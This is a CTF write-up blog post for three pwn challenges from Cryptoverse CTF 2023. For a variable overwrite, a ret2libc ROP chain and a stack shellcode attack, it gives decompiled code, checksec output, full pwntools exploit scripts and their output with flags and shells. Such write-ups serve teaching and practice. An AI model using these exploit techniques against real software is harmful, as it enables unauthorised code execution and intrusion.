---
title: Cryptoverse CTF 2023
date: 2023-05-08 07:30:00 +0100
categories: [CTF, "2023"]
tags: [ctf, cryptoverse, "2023", pwn, rop, "variable-overwrite", "ret2libc", shellcode]
media_subpath: /assets/img/cryptoverse23/
---
These are my writeups for all the pwn-challenges at Cryptoverse CTF 2023.

## Acceptance
> Difficulty: Easy
>
> I want to go out but I need to ask my mom first. Help me guys!
>
> Files: acceptance

We are give a binary which when reversed looks like this
```c
int print_flag(void){
  uint *puVar1;
  char flag [44];
  int flag_txt;
  if (accept < 1) {
    if (accept == -1) {
      flag_txt = open("/home/me/flag.txt",0);
      if (flag_txt == -1) {
        puVar1 = (uint *)__errno_location();
        fprintf(stderr,"Error num %d\n",(ulong)*puVar1);
      }
      else {
        read(flag_txt,flag,0x22);
        close(flag_txt);
        write(1,flag,0x22);
        putchar(10);
      }
    }
    else {
      puts("Nah, You are a liar!");
    }
  }
  else {
    puts("You ask a lot and she suspect me :((");
  }
  return 0;
}

int main(EVP_PKEY_CTX *param_1){
  init(param_1);
  puts("I wanna go out but I need mom\'s permisison.");
  printf("Help him: ");
  read(0,say,0x24);
  if (accept == 0) {
    puts("Arg! Why don\'t you help me :((");
  }
  else {
    print_flag();
  }
  return 0;
}
```

and have the following protections
```bash
$ checksec ./acceptance
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
{: .nolineno }

Our input is read into the global variable `say`, and ifthe global variable `accept` is not equal to 0 the `print_flag` function will be called. Inside `print_flag` we need the `accept` variable to be equal to 1.

We can overflow the `say` variable so that we overwrite the `accept` value, giving the value of -1.

We find the offset to the `accept` variable with a cyclic pattern in pwntools by breaking after our input has been read in
![Accept offset](accept_offset.png)

Knowing the offset we can write the -1 value to the `accept` variable
```python
io = start()

offset = 32
payload = b"A" * offset
payload += pack(-1)

io.recvuntil(b"him: ")
io.sendline(payload)

io.interactive()
```
{: .nolineno file="exploit.py" }

```bash
$ python3 exploit.py
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Switching to interactive mode
cvctf{Y34h_1_c4N_G0_n0w_tH4nK_y4u}
```
{: .nolineno }


## Ret2school
> Difficulty: Medium
>
> Bypass the authentication system by sending your homework over.
>
> Files: ret2school ld-2.27.so libc.so.6

Main-function of the binary looks like this
```c
int main(EVP_PKEY_CTX *param_1){
  char input [32];
  init(param_1);
  printf("Send me your homework: ");
  gets(input);
  return 0;
}
```
and the binary has the following protections
```bash
$ checksec ./ret2school
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
```
{: .nolineno }

Since we have the `gets` function gathering our input, and no stack-canary or PIE, this looks like a simple ret2libc attack where we find the base-address of ASLR before calling `system("/bin/sh")`.

We find the offset to be 40 by sending a cyclic pattern as input, and checking the offset into the cyclic pattern for the address we crash at, which in this case is `0x6161616161616166`
![Ret2school Offset](ret2school_offset.png)

Since we don't have a `puts` function to leak the GOT address of we leak for `printf` instead. In this case it leads to some extra stack-misalignments. Identifying stack-misalignment can be done by checking the instruction which we crash on, which in this case were `movaps`
![Stack Misalignment Crash](stack_misaligned.png)

This sometimes happen on 64-bit binaries, and can be solved by adding an extra `pack(ret)` in the payload to align the stack. I had to align the stack a total of 3 times for the full exploit to work.

The exploit ended up being
```python
offset = 40
libc = ELF('./libc.so.6', checksec=False)
ret = 0x40050e

io = start()

rop = ROP(exe)
rop.raw(b"A"*offset)
rop.raw(ret)
rop.printf(exe.got.printf)
rop.raw(ret)
rop.main()

io.recvuntil(b"homework: ")
io.sendline(rop.chain())

printf = u64(io.recvuntil(b"Send")[:-4].rstrip().ljust(8, b"\x00"))
log.success(f"printf: {hex(printf)}")
libc.address = printf - libc.symbols.printf
log.success(f"libc: {hex(libc.address)}")

rop = ROP(libc)
rop.raw(b"A"*offset)
rop.raw(ret)
rop.system(next(libc.search(b"/bin/sh\x00")))

io.recvuntil(b"homework: ")
io.sendline(rop.chain())
io.interactive()
```
{: .nolineno file="exploit.py" }

which gives shell on the server
```bash
$ python3 exploit.py
[*] Loaded 14 cached gadgets for './ret2school'
[+] printf: 0x7fb6c7e7de40
[+] libc: 0x7fb6c7e19000
[*] Loaded 199 cached gadgets for './libc.so.6'
[*] Switching to interactive mode
$ cat flag
cvctf{ret2libc_bfbfa238da098120}
```
{: .nolineno }

Although there were some stack-misalignment which were not expected (2 occurrences in the 1st payload) I managed to first-blood this challenge

![First Blood](blood.png)


## Commando Conquest
> Difficulty: Medium
>
> Background Story
>
> You enter the room and see a single PC on a desk, humming quietly. You know that you need to gain shell access to proceed, but it won't be easy.
>
> The PC is protected by a series of sophisticated security measures, and you'll need to use all of your skills to bypass them. You pull up a chair and start working on the task at hand. As you type away at the keyboard, the screen flickers to life, displaying a command prompt.
>
> The real challenge is yet to come. The HoYoverse security team is surely on high alert, and you'll need to stay one step ahead if you want to make it out with the information you need. Conquer the shell prompt and uncover the final secret.
>
> Files: shellprompt

This challenge were part 4 of a 5-part story, where the other challenges were in other categories than pwn.

This is a type of challenge which I have not written a writeup for yet! The reversed form of the binary looks like this
```c
void shell(void){
  char input [132];
  printf("Backdoor secret: %p\n",input);
  printf("Execute: ");
  gets(input);
  return;
}

int main(void){
  EVP_PKEY_CTX *in_stack_fffffff0;
  init(in_stack_fffffff0);
  shell();
  return 0;
}
```

and the binary protections
```bash
$ checksec ./shellprompt
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
{: .nolineno }

A binary without NX means that we can execute shellcode from the stack, and the `shell` function provides us with the address of the buffer where our input is located.

The exploit here is that we can input `shellcode` and overwrite the `rip` register to make the program jump to and start executing our shellcode.

We start by finding the offset to `rip` with the same method as the two previous challenges. We find the offset to be 140.

Since we have to write 140 bytes, consisting of our shellcode + padding, to start to overwrite `rip`, we will use a `nopsled` to lead the program execution to our shellcode.

If we had used e.g. `A`'s as the padding in our shellcode the program would crash to du `0x41` not being valid instructions. We will therefore use `nop` instructions which are `0x90`, as they just pass on the execution to the next instruction, until it eventually hits our shellcode. [Computerphile](https://www.youtube.com/watch?v=1S0aBV-Waeo) has a nice video explaining the attack we perform more in detail.

So our payload will then consist of `nops + shellcode + buffer-address`, and ends up looking like this
```python
context.arch = 'i386'
offset = 140
io = start()

io.recvuntil(b"secret: ")
buffer = int(io.recvline().strip(), 16)
log.success("buffer: " + hex(buffer))

payload = asm(shellcraft.sh()).ljust(offset, b"\x90")
payload += pack(buffer)

io.recvuntil(b"Execute: ")
io.sendline(payload)
io.interactive()
```
{: .nolineno }

`shellcraft.sh()` is a pwntools function which creates assembly-instructions (our shellcode) which spawn a `/bin/sh` shell for us.

```bash
$ python3 exploit.py
[+] buffer: 0xfff1b530
[*] Switching to interactive mode
$ cat flag
cvctf{ret2ShELLc0d3_b013af54}
```
{: .nolineno }